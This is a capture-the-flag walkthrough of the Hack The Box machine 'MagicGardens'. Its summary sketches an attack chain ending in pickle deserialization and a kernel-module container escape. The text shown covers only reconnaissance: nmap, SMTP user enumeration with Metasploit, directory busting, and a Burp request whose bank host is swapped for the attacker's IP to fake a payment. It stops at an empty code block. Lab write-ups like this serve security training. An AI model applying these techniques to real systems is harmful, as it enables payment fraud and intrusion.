---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Insane
  - ClientSide
  - SMTP
  - UsernameEnumeration
  - RequestManipulation
  - API
  - Docker
  - DockerRegistry
  - BruteForcing
  - Hash
  - Cracking
  - Django
  - PythonPickle
  - PythonPickleDeserialization
  - ContainerEscape
  - CAP_SYS_MODULE
  - LoadableKernelModule
  - LKM
---

![](images/MagicGardens.png)

## Summary

The box starts with a few open ports like `25/TCP`, `80/TCP` and `5000/TCP`. Pretty early on the box a few usernames can be enumerated by using the `stmp_enum` module from `Metasploit`. Using are more advanced `wordlist` can show two additional users named `morty` and `alex`. On the website itself you can find a web shop on which you can create an account. By `manipulating` the `request` which is send to `honestbank.htb` for `upgrading the subscription`, pointing directly to the attacker machine on which a small `flask application` provides a valid endpoint to send back an `HTTP/1.1 200` status code to successfully performing the upgrade. After buying again something on the web shop, you receive a message from `morty` in your `inbox`, asking for a `QR code`. Since we couldn't figure out what to do here because all of our testing was basically blind, we decided to `brute force` the `Docker Registry` and found the `password` for `alex`. Knowing his password makes you `capable` of `dumping` all files on the `registry`. Inside the `tarballs` you can find hints about the use of `PythonPickle` and a potential `PythonPickle Deserialization` attack vector. There is also a `.env` file which contains the `SECRET_KEY` which is required for the `Deserialization Attack`. Furthermore a `db.sqlite3` can be found which contains a `crackable hash` for the `password` of `morty`. Having that enables `SSH` into the box. Since this was also a dead end for us, we headed back to the `Django Admin Panel` and accessed it with the credentials of `morty`. A small `PythonPickle Deserialization script` did the job of providing us a working payload to gain a `reverse shell` inside a `Docker Container` as `root`. A quick check on the available `capabilities` shows the untypical `CAP_SYS_MODULE` capability set. This allows to abuse `Loadable Kernel Modules` to execute `arbitrary commands` like a `reverse shell` payload. After the files are transferred into the container, the `malicious module` can be `build` and `loaded`. This grants a shell as root on the main system.

## Table of Contents

- [Reconnaissance)
  - [Port Scanning](#Port-Scanning)
  - [Enumeration of Port 25/TCP](#Enumeration-of-Port-25TCP)
  - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
  - [Enumeration of Port 5000/TCP](#Enumeration-of-Port-5000TCP)
  - [API Enumeration](#API-Enumeration)
- [Upgrading Subscription](#Upgrading-Subscription)
- [User Enumeration via SMTP Part 2](#User-Enumeration-via-SMTP-Part-2)
- [Brute Forcing the Docker Registry](#Brute-Forcing-the-Docker-Registry)
- [Foothold](#Foothold)
  - [Investigating Docker API](#Investigating-Docker-API)
  - [Cracking the Hash](#Cracking-the-Hash)
- [Enumeration](#Enumeration)
  - [LinPEAS](#LinPEAS)
- [Django Administration Panel](#Django-Administration-Panel)
- [Privilege Escalation into Docker Container](#Privilege-Escalation-into-Docker-Container)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [user.txt](#usertxt)
- [root.txt](#roottxt)
- [Post Exploitation](#Post-Exploitation)

## Reconnaissance

### Port Scanning

We started with scanning all available ports as usual. This box though served us some issues why we stopped after a basic `Nmap` scan.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.11.161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 15:02 EDT
Nmap scan report for 10.129.11.161
Host is up (0.017s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:72:62:48:99:33:4f:fc:59:f8:6c:05:59:db:a7:7b (ECDSA)
|_  256 62:c6:35:7e:82:3e:b1:0f:9b:6f:5b:ea:fe:c5:85:9a (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http     nginx 1.22.1
|_http-title: Did not follow redirect to http://magicgardens.htb/
5000/tcp open  ssl/http Docker Registry (API: 2.0)
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2023-05-23T11:57:43
|_Not valid after:  2024-05-22T11:57:43
|_http-title: Site doesn't have a title.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.50 seconds
```

### Enumeration of Port 25/TCP

On port `25/TCP` we could send emails `without authentication`. We saved that for later.

```c
┌──(kali㉿kali)-[~]
└─$ telnet 10.129.11.161 25
Trying 10.129.11.161...
Connected to 10.129.11.161.
Escape character is '^]'.
EHLO ALL
220 magicgardens.magicgardens.htb ESMTP Postfix (Debian/GNU)
250-magicgardens.magicgardens.htb
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
421 4.4.2 magicgardens.magicgardens.htb Error: timeout exceeded
Connection closed by foreign host.
```

#### User Enumeration via SMTP Part 1

But we used the `smtp_enum` module from `Metasploit` to checkout the available users on the system. Since we used the `default wordlist` we didn't find anything special besides technical users.

```c
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Search can apply complex filters such as search cve:2009 
type:exploit, see all the filters with help search
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.4.5-dev                           ]
+ -- --=[ 2413 exploits - 1242 auxiliary - 423 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use auxiliary/scanner/smtp/smtp_enum

msf6 auxiliary(scanner/smtp/smtp_enum) > show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                                Required  Description
   ----       ---------------                                                --------  -----------
   RHOSTS                                                                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      25                                                             yes       The target port (TCP)
   THREADS    1                                                              yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.129.11.161
RHOSTS => 10.129.11.161
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.129.11.161:25      - 10.129.11.161:25 Banner: 220 magicgardens.magicgardens.htb ESMTP Postfix (Debian/GNU)
[+] 10.129.11.161:25      - 10.129.11.161:25 Users found: , _apt, avahi-autoipd, backup, bin, daemon, games, irc, list, lp, mail, man, messagebus, news, nobody, postfix, postmaster, proxy, sshd, sync, sys, systemd-network, uucp, www-data
[*] 10.129.11.161:25      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Enumeration of Port 80/TCP

On port `80/TCP` we got redirected to `magicgardens.htb` which we added to our `/etc/hosts` file as usual.

- [http://10.129.11.161/](http://10.129.11.161/)

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.11.161   magicgardens.htb
10.129.11.161   magicgardens.magicgardens.htb
```

The `tech stack` was not that interesting.

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://magicgardens.htb
http://magicgardens.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTTPServer[nginx/1.22.1], IP[10.129.11.161], Title[Magic Gardens], UncommonHeaders[x-content-type-options,referrer-policy,cross-origin-opener-policy], X-Frame-Options[DENY], nginx[1.22.1]
```

On the website itself we faced a `web shop` to buy flowers.

![](images/2024-05-18_15-15_website.png)

We also could `register` a new user which we did.

![](images/2024-05-18_15-15_website_login.png)

It was necessary to fill out all the field but at least there was no `cronjob` to reset the user accounts every few minutes. Thankfully!

![](images/2024-05-18_15-15_website_account_creation.png)

We created an dummy account and logged in.

![](images/2024-05-18_15-15_website_successful_login.png)

#### Directory Busting

To make sure we didn't miss any relevant endpoints, we performed `Directory Busting` using `dirsearch`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/files]
└─$ dirsearch -u http://magicgardens.htb/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /media/sf_cybersecurity/notes/HTB/Machines/MagicGardens/files/reports/http_magicgardens.htb/__24-05-18_21-45-22.txt

Target: http://magicgardens.htb/

[11:45:22] Starting: 
[11:45:40] 301 -    0B  - /admin  ->  /admin/                               
[11:45:42] 302 -    0B  - /admin/_logs/access.log  ->  /admin/login/?next=/admin/_logs/access.log
[11:45:42] 302 -    0B  - /admin/_logs/error-log  ->  /admin/login/?next=/admin/_logs/error-log
[11:45:42] 302 -    0B  - /admin/access.txt  ->  /admin/login/?next=/admin/access.txt
[11:45:42] 302 -    0B  - /admin/access_log  ->  /admin/login/?next=/admin/access_log
[11:45:42] 302 -    0B  - /admin/account  ->  /admin/login/?next=/admin/account
[11:45:42] 302 -    0B  - /admin/account.jsp  ->  /admin/login/?next=/admin/account.jsp
[11:45:42] 302 -    0B  - /admin/account.php  ->  /admin/login/?next=/admin/account.php
[11:45:42] 302 -    0B  - /admin/account.aspx  ->  /admin/login/?next=/admin/account.aspx
[11:45:42] 302 -    0B  - /admin/account.js  ->  /admin/login/?next=/admin/account.js
[11:45:42] 302 -    0B  - /admin/admin-login  ->  /admin/login/?next=/admin/admin-login
[11:45:42] 302 -    0B  - /admin/  ->  /admin/login/?next=/admin/
[11:45:42] 302 -    0B  - /admin/admin-login.php  ->  /admin/login/?next=/admin/admin-login.php
[11:45:42] 302 -    0B  - /admin/%3bindex/  ->  /admin/login/?next=/admin/%253Bindex/
[11:45:42] 302 -    0B  - /admin/.config  ->  /admin/login/?next=/admin/.config
[11:45:42] 302 -    0B  - /admin/admin-login.jsp  ->  /admin/login/?next=/admin/admin-login.jsp
[11:45:42] 302 -    0B  - /admin/admin.html  ->  /admin/login/?next=/admin/admin.html
[11:45:42] 302 -    0B  - /admin/admin.jsp  ->  /admin/login/?next=/admin/admin.jsp
[11:45:42] 302 -    0B  - /admin/_logs/access-log  ->  /admin/login/?next=/admin/_logs/access-log
[11:45:42] 302 -    0B  - /admin/admin_login  ->  /admin/login/?next=/admin/admin_login
[11:45:42] 302 -    0B  - /admin/admin/login  ->  /admin/login/?next=/admin/admin/login
[11:45:42] 302 -    0B  - /admin/admin_login.php  ->  /admin/login/?next=/admin/admin_login.php
[11:45:42] 302 -    0B  - /admin/_logs/access_log  ->  /admin/login/?next=/admin/_logs/access_log
[11:45:42] 302 -    0B  - /admin/admin_login.aspx  ->  /admin/login/?next=/admin/admin_login.aspx
[11:45:42] 302 -    0B  - /admin/_logs/err.log  ->  /admin/login/?next=/admin/_logs/err.log
[11:45:42] 302 -    0B  - /admin/admin_login.jsp  ->  /admin/login/?next=/admin/admin_login.jsp
[11:45:42] 302 -    0B  - /admin/_logs/error.log  ->  /admin/login/?next=/admin/_logs/error.log
[11:45:42] 302 -    0B  - /admin/_logs/error_log  ->  /admin/login/?next=/admin/_logs/error_log
[11:45:42] 302 -    0B  - /admin/adminer.php  ->  /admin/login/?next=/admin/adminer.php
[11:45:42] 302 -    0B  - /admin/_logs/login.txt  ->  /admin/login/?next=/admin/_logs/login.txt
[11:45:42] 302 -    0B  - /admin/adminLogin  ->  /admin/login/?next=/admin/adminLogin
[11:45:42] 302 -    0B  - /admin/adminLogin.php  ->  /admin/login/?next=/admin/adminLogin.php
[11:45:42] 302 -    0B  - /admin/adminLogin.js  ->  /admin/login/?next=/admin/adminLogin.js
[11:45:42] 302 -    0B  - /admin/backup/  ->  /admin/login/?next=/admin/backup/
[11:45:42] 302 -    0B  - /admin/backups/  ->  /admin/login/?next=/admin/backups/
[11:45:42] 302 -    0B  - /admin/controlpanel  ->  /admin/login/?next=/admin/controlpanel
[11:45:42] 302 -    0B  - /admin/controlpanel.php  ->  /admin/login/?next=/admin/controlpanel.php
[11:45:42] 302 -    0B  - /admin/controlpanel.aspx  ->  /admin/login/?next=/admin/controlpanel.aspx
[11:45:42] 302 -    0B  - /admin/controlpanel.jsp  ->  /admin/login/?next=/admin/controlpanel.jsp
[11:45:42] 302 -    0B  - /admin/account.html  ->  /admin/login/?next=/admin/account.html
[11:45:42] 302 -    0B  - /admin/controlpanel.js  ->  /admin/login/?next=/admin/controlpanel.js
[11:45:42] 302 -    0B  - /admin/admin  ->  /admin/login/?next=/admin/admin
[11:45:42] 302 -    0B  - /admin/cp  ->  /admin/login/?next=/admin/cp       
[11:45:42] 302 -    0B  - /admin/cp.php  ->  /admin/login/?next=/admin/cp.php
[11:45:42] 302 -    0B  - /admin/admin-login.aspx  ->  /admin/login/?next=/admin/admin-login.aspx
[11:45:42] 302 -    0B  - /admin/cp.jsp  ->  /admin/login/?next=/admin/cp.jsp
[11:45:42] 302 -    0B  - /admin/admin.php  ->  /admin/login/?next=/admin/admin.php
[11:45:42] 302 -    0B  - /admin/data/autosuggest  ->  /admin/login/?next=/admin/data/autosuggest
[11:45:42] 302 -    0B  - /admin/db/  ->  /admin/login/?next=/admin/db/
[11:45:42] 302 -    0B  - /admin/admin.aspx  ->  /admin/login/?next=/admin/admin.aspx
[11:45:42] 302 -    0B  - /admin/admin.js  ->  /admin/login/?next=/admin/admin.js
[11:45:42] 302 -    0B  - /admin/download.php  ->  /admin/login/?next=/admin/download.php
[11:45:42] 302 -    0B  - /admin/dumper/  ->  /admin/login/?next=/admin/dumper/
[11:45:42] 302 -    0B  - /admin/error.txt  ->  /admin/login/?next=/admin/error.txt
[11:45:42] 302 -    0B  - /admin/error_log  ->  /admin/login/?next=/admin/error_log
[11:45:42] 302 -    0B  - /admin/admin_login.html  ->  /admin/login/?next=/admin/admin_login.html
[11:45:42] 302 -    0B  - /admin/errors.log  ->  /admin/login/?next=/admin/errors.log
[11:45:42] 302 -    0B  - /admin/export.php  ->  /admin/login/?next=/admin/export.php
[11:45:42] 302 -    0B  - /admin/admin_login.js  ->  /admin/login/?next=/admin/admin_login.js
[11:45:42] 302 -    0B  - /admin/FCKeditor  ->  /admin/login/?next=/admin/FCKeditor
[11:45:42] 302 -    0B  - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
[11:45:42] 302 -    0B  - /admin/adminLogin.aspx  ->  /admin/login/?next=/admin/adminLogin.aspx
[11:45:42] 302 -    0B  - /admin/adminLogin.jsp  ->  /admin/login/?next=/admin/adminLogin.jsp
[11:45:42] 302 -    0B  - /admin/adminLogin.html  ->  /admin/login/?next=/admin/adminLogin.html
[11:45:42] 302 -    0B  - /admin/config.php  ->  /admin/login/?next=/admin/config.php
[11:45:42] 302 -    0B  - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/connectors/asp/upload.asp
[11:45:42] 302 -    0B  - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx
[11:45:42] 302 -    0B  - /admin/fckeditor/editor/filemanager/connectors/php/upload.php  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/connectors/php/upload.php
[11:45:42] 302 -    0B  - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx
[11:45:42] 302 -    0B  - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/upload/asp/upload.asp
[11:45:42] 302 -    0B  - /admin/controlpanel.html  ->  /admin/login/?next=/admin/controlpanel.html
[11:45:42] 302 -    0B  - /admin/cp.aspx  ->  /admin/login/?next=/admin/cp.aspx
[11:45:42] 302 -    0B  - /admin/file.php  ->  /admin/login/?next=/admin/file.php
[11:45:42] 302 -    0B  - /admin/files.php  ->  /admin/login/?next=/admin/files.php
[11:45:42] 302 -    0B  - /admin/heapdump  ->  /admin/login/?next=/admin/heapdump
[11:45:42] 302 -    0B  - /admin/admin-login.html  ->  /admin/login/?next=/admin/admin-login.html
[11:45:42] 302 -    0B  - /admin/admin-login.js  ->  /admin/login/?next=/admin/admin-login.js
[11:45:42] 302 -    0B  - /admin/cp.html  ->  /admin/login/?next=/admin/cp.html
[11:45:42] 302 -    0B  - /admin/home  ->  /admin/login/?next=/admin/home
[11:45:42] 302 -    0B  - /admin/home.php  ->  /admin/login/?next=/admin/home.php
[11:45:42] 302 -    0B  - /admin/default  ->  /admin/login/?next=/admin/default
[11:45:42] 302 -    0B  - /admin/home.html  ->  /admin/login/?next=/admin/home.html
[11:45:42] 302 -    0B  - /admin/default.asp  ->  /admin/login/?next=/admin/default.asp
[11:45:42] 302 -    0B  - /admin/default/admin.asp  ->  /admin/login/?next=/admin/default/admin.asp
[11:45:42] 302 -    0B  - /admin/default/login.asp  ->  /admin/login/?next=/admin/default/login.asp
[11:45:42] 302 -    0B  - /admin/index.php  ->  /admin/login/?next=/admin/index.php
[11:45:42] 302 -    0B  - /admin/index.jsp  ->  /admin/login/?next=/admin/index.jsp
[11:45:42] 302 -    0B  - /admin/index.html  ->  /admin/login/?next=/admin/index.html
[11:45:42] 302 -    0B  - /admin/js/tiny_mce/  ->  /admin/login/?next=/admin/js/tiny_mce/
[11:45:42] 302 -    0B  - /admin/js/tinymce  ->  /admin/login/?next=/admin/js/tinymce
[11:45:42] 302 -    0B  - /admin/access.log  ->  /admin/login/?next=/admin/access.log
[11:45:42] 302 -    0B  - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
[11:45:42] 302 -    0B  - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/connectors/asp/connector.asp
[11:45:42] 302 -    0B  - /admin/fckeditor/editor/filemanager/connectors/php/connector.php  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/connectors/php/connector.php
[11:45:42] 302 -    0B  - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
[11:45:42] 302 -    0B  - /admin/login.aspx  ->  /admin/login/?next=/admin/login.aspx
[11:45:42] 302 -    0B  - /admin/login.jsp  ->  /admin/login/?next=/admin/login.jsp
[11:45:42] 302 -    0B  - /admin/fckeditor/editor/filemanager/upload/php/upload.php  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/upload/php/upload.php
[11:45:42] 302 -    0B  - /admin/login.asp  ->  /admin/login/?next=/admin/login.asp
[11:45:42] 302 -    0B  - /admin/login.do  ->  /admin/login/?next=/admin/login.do
[11:45:42] 302 -    0B  - /admin/login.py  ->  /admin/login/?next=/admin/login.py
[11:45:42] 302 -    0B  - /admin/login.htm  ->  /admin/login/?next=/admin/login.htm
[11:45:42] 302 -    0B  - /admin/home.jsp  ->  /admin/login/?next=/admin/home.jsp
[11:45:42] 302 -    0B  - /admin/index  ->  /admin/login/?next=/admin/index
[11:45:42] 302 -    0B  - /admin/includes/configure.php~  ->  /admin/login/?next=/admin/includes/configure.php~
[11:45:42] 302 -    0B  - /admin/error.log  ->  /admin/login/?next=/admin/error.log
[11:45:42] 302 -    0B  - /admin/.htaccess  ->  /admin/login/?next=/admin/.htaccess
[11:45:42] 302 -    0B  - /admin/login.rb  ->  /admin/login/?next=/admin/login.rb
[11:45:42] 302 -    0B  - /admin/home.js  ->  /admin/login/?next=/admin/home.js
[11:45:42] 302 -    0B  - /admin/index.aspx  ->  /admin/login/?next=/admin/index.aspx
[11:45:42] 302 -    0B  - /admin/logs/  ->  /admin/login/?next=/admin/logs/
[11:45:43] 302 -    0B  - /admin/js/tiny_mce  ->  /admin/login/?next=/admin/js/tiny_mce
[11:45:43] 302 -    0B  - /admin/index.js  ->  /admin/login/?next=/admin/index.js
[11:45:43] 302 -    0B  - /admin/logs/access-log  ->  /admin/login/?next=/admin/logs/access-log
[11:45:43] 302 -    0B  - /admin/logs/access.log  ->  /admin/login/?next=/admin/logs/access.log
[11:45:43] 302 -    0B  - /admin/logs/access_log  ->  /admin/login/?next=/admin/logs/access_log
[11:45:43] 302 -    0B  - /admin/js/tinymce/  ->  /admin/login/?next=/admin/js/tinymce/
[11:45:43] 302 -    0B  - /admin/logs/error.log  ->  /admin/login/?next=/admin/logs/error.log
[11:45:43] 302 -    0B  - /admin/logs/errors.log  ->  /admin/login/?next=/admin/logs/errors.log
[11:45:43] 302 -    0B  - /admin/log  ->  /admin/login/?next=/admin/log
[11:45:43] 302 -    0B  - /admin/manage/admin.asp  ->  /admin/login/?next=/admin/manage/admin.asp
[11:45:43] 302 -    0B  - /admin/mysql/  ->  /admin/login/?next=/admin/mysql/
[11:45:43] 302 -    0B  - /admin/phpMyAdmin  ->  /admin/login/?next=/admin/phpMyAdmin
[11:45:43] 302 -    0B  - /admin/phpMyAdmin/  ->  /admin/login/?next=/admin/phpMyAdmin/
[11:45:43] 302 -    0B  - /admin/login  ->  /admin/login/?next=/admin/login
[11:45:43] 302 -    0B  - /admin/phpmyadmin/  ->  /admin/login/?next=/admin/phpmyadmin/
[11:45:43] 302 -    0B  - /admin/login.js  ->  /admin/login/?next=/admin/login.js
[11:45:43] 302 -    0B  - /admin/login.html  ->  /admin/login/?next=/admin/login.html
[11:45:43] 302 -    0B  - /admin/phpmyadmin/index.php  ->  /admin/login/?next=/admin/phpmyadmin/index.php
[11:45:43] 302 -    0B  - /admin/phpMyAdmin/index.php  ->  /admin/login/?next=/admin/phpMyAdmin/index.php
[11:45:43] 302 -    0B  - /admin/pMA/  ->  /admin/login/?next=/admin/pMA/
[11:45:43] 302 -    0B  - /admin/pma/  ->  /admin/login/?next=/admin/pma/
[11:45:43] 302 -    0B  - /admin/cp.js  ->  /admin/login/?next=/admin/cp.js
[11:45:43] 302 -    0B  - /admin/pma/index.php  ->  /admin/login/?next=/admin/pma/index.php
[11:45:43] 302 -    0B  - /admin/pol_log.txt  ->  /admin/login/?next=/admin/pol_log.txt
[11:45:43] 302 -    0B  - /admin/PMA/index.php  ->  /admin/login/?next=/admin/PMA/index.php
[11:45:43] 302 -    0B  - /admin/home.aspx  ->  /admin/login/?next=/admin/home.aspx
[11:45:43] 302 -    0B  - /admin/private/logs  ->  /admin/login/?next=/admin/private/logs
[11:45:43] 302 -    0B  - /admin/scripts/fckeditor  ->  /admin/login/?next=/admin/scripts/fckeditor
[11:45:43] 302 -    0B  - /admin/secure/logon.jsp  ->  /admin/login/?next=/admin/secure/logon.jsp
[11:45:43] 302 -    0B  - /admin/logon.jsp  ->  /admin/login/?next=/admin/logon.jsp
[11:45:43] 302 -    0B  - /admin/logs/err.log  ->  /admin/login/?next=/admin/logs/err.log
[11:45:43] 302 -    0B  - /admin/logs/error-log  ->  /admin/login/?next=/admin/logs/error-log
[11:45:43] 302 -    0B  - /admin/logs/error_log  ->  /admin/login/?next=/admin/logs/error_log
[11:45:43] 302 -    0B  - /admin/manage.asp  ->  /admin/login/?next=/admin/manage.asp
[11:45:43] 302 -    0B  - /admin/logs/login.txt  ->  /admin/login/?next=/admin/logs/login.txt
[11:45:43] 302 -    0B  - /admin/log/error.log  ->  /admin/login/?next=/admin/log/error.log
[11:45:43] 302 -    0B  - /admin/upload.php  ->  /admin/login/?next=/admin/upload.php
[11:45:43] 302 -    0B  - /admin/web/  ->  /admin/login/?next=/admin/web/
[11:45:43] 302 -    0B  - /admin/login.php  ->  /admin/login/?next=/admin/login.php
[11:45:43] 302 -    0B  - /admin/phpmyadmin2/index.php  ->  /admin/login/?next=/admin/phpmyadmin2/index.php
[11:45:43] 302 -    0B  - /admin/portalcollect.php?f=http://xxx&t=js  ->  /admin/login/?next=/admin/portalcollect.php%3Ff%3Dhttp%3A//xxx%26t%3Djs
[11:45:43] 302 -    0B  - /admin/release  ->  /admin/login/?next=/admin/release
[11:45:43] 302 -    0B  - /admin/sqladmin/  ->  /admin/login/?next=/admin/sqladmin/
[11:45:43] 302 -    0B  - /admin/signin  ->  /admin/login/?next=/admin/signin
[11:45:43] 302 -    0B  - /admin/manage  ->  /admin/login/?next=/admin/manage
[11:45:43] 302 -    0B  - /admin/manage/login.asp  ->  /admin/login/?next=/admin/manage/login.asp
[11:45:43] 302 -    0B  - /admin/tinymce  ->  /admin/login/?next=/admin/tinymce
[11:45:43] 302 -    0B  - /admin/sysadmin/  ->  /admin/login/?next=/admin/sysadmin/
[11:45:43] 302 -    0B  - /admin/views/ajax/autocomplete/user/a  ->  /admin/login/?next=/admin/views/ajax/autocomplete/user/a
[11:45:43] 302 -    0B  - /admin/sxd/  ->  /admin/login/?next=/admin/sxd/   
[11:45:43] 302 -    0B  - /admin/mysql2/index.php  ->  /admin/login/?next=/admin/mysql2/index.php
[11:45:43] 302 -    0B  - /admin/user_count.txt  ->  /admin/login/?next=/admin/user_count.txt
[11:45:44] 302 -    0B  - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php  ->  /admin/login/?next=/admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
[11:45:44] 302 -    0B  - /admin/mysql/index.php  ->  /admin/login/?next=/admin/mysql/index.php
[11:45:44] 302 -    0B  - /admin/uploads.php  ->  /admin/login/?next=/admin/uploads.php
[11:45:44] 302 -    0B  - /admin/tiny_mce  ->  /admin/login/?next=/admin/tiny_mce
[11:46:00] 301 -    0B  - /catalog  ->  /catalog/                           
[11:46:00] 301 -    0B  - /cart  ->  /cart/                                 
[11:46:01] 301 -    0B  - /check  ->  /check/                               
[11:46:23] 301 -    0B  - /login  ->  /login/                               
[11:46:24] 200 -    7KB - /login/                                           
[11:46:24] 301 -    0B  - /logout  ->  /logout/                             
[11:46:24] 500 -  145B  - /logout/                                          
[11:46:26] 403 -  555B  - /media/                                           
[11:46:26] 404 -  555B  - /media/export-criteo.xml                          
[11:46:36] 301 -    0B  - /profile  ->  /profile/                           
[11:46:38] 301 -    0B  - /register  ->  /register/                         
[11:46:40] 301 -    0B  - /search  ->  /search/                             
[11:46:45] 404 -  555B  - /static/api/swagger.yaml                          
[11:46:45] 404 -  555B  - /static/dump.sql
[11:46:45] 404 -  555B  - /static/api/swagger.json                          
[11:46:50] 301 -    0B  - /subscribe  ->  /subscribe/                       
                                                                             
Task Completed
```

It seemed that there was an `/admin` endpoint. But since we had no credentials yet, we saved this information for later.

### Enumeration of Port 5000/TCP

We found a `Docker Registry` on port `5000/TCP`, we just had to access `HTTPS` instead of `HTTP` but even then credentials were required.

- [http://magicgardens.htb:5000/](http://magicgardens.htb:5000/)

![](images/2024-05-18_15-26_port_5000.png)

- [https://magicgardens.htb:5000/](https://magicgardens.htb:5000/)

### API Enumeration

On the `Subscription` tab we could add a `payment method` to upgrade our `subscription`. The only viable option was `number one` since two and three ran into timeouts while testing.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.11.161   magicgardens.htb
10.129.11.161   magicgardens.magicgardens.htb
10.129.11.161   honestbank.htb
10.120.11.161   magicalbank.htb
10.120.11.161   plunders.htb
```

To fill out the form we used exactly the examples on the website.

After intercepting the request with `Burp Suite` we changed the `Fully Qualified Domain Name (FQDN)` of the bank and pointed it to our `local machine`.

![](images/2024-05-18_15-15_website_profile_subscription_upgrade.png)

```c
POST /subscribe/ HTTP/1.1
Host: magicgardens.htb
Content-Length: 183
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://magicgardens.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://magicgardens.htb/profile/?tab=subscription&action=upgrade
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=xaDLYhwOwBO4jRSJoMsV0nJqha35ger0; sessionid=.eJxrYJ3awgABtVM0ejhKi1OL8hJzU6f0sKXl5yclFgEZxSWJJaXFU3o4gksS81ISi1Km9HCWZxZnxOdkFpdM6WGY0sMD5ibnl-aVpBZNyWDr4UxOLCqByos7JwKNLMnMz6txziiqLE7MK8lIzS3NBWoDq4Jp82Yq1QMAxVM2wg:1s8Q0Q:FxcQmnE39HS4yTXmoYtaDMHKLQCqIY8XlDlPg7V2Fak
Connection: close

csrfmiddlewaretoken=FVrQJO2WpykYXyxQWdWsAbpxFpyKv4Kk2VUrxVoALZYS6ffpaPedqoYNMprFB81a&bank=10.10.14.76&cardname=foobar&cardnumber=1234-4567-8901&expmonth=September&expyear=2026&cvv=111
```

![](images/2024-05-18_15-15_website_profile_subscription_upgrade_burp_suite.png)

And we got a hit with a `POST` request to `/api/payments/`.

```c
